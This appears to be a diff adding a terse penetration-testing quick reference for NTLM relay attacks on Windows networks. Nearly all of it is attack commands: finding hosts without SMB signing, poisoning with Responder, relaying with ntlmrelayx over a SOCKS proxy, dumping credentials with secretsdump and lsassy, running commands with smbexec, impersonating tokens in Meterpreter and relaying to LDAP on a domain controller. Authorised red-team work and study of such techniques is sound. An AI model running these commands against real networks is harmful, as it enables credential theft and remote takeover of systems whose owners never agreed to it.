@@ -1,0 +1,16 @@
+NTLM RELAY - QUICK REF
+
+0.  nxc smb <subnet>/<cidr>              # confirm signing:False on target
+1.  Responder.conf → SMB = Off, HTTP = Off
+2.  sudo responder -I <interface>
+3.  impacket-ntlmrelayx -t <target-ip> -smb2support -socks -of netntlm.hash
+4.  /etc/proxychains4.conf → socks4 127.0.0.1 1080  (strict_chain)
+5a. proxychains impacket-secretsdump --no-pass '<domain>/<user>'@'<target-ip>'
+5b. proxychains lsassy --no-pass -d <domain> -u <user> <target-ip>
+5c. proxychains impacket-smbexec --no-pass '<domain>/<user>'@'<target-ip>'
+
+[token impersonation - Meterpreter]
+    use incognito → list_tokens -u → impersonate_token 'DOMAIN\user' → rev2self
+
+[LDAP relay]
+    impacket-ntlmrelayx -t ldap://<dc-ip> -smb2support
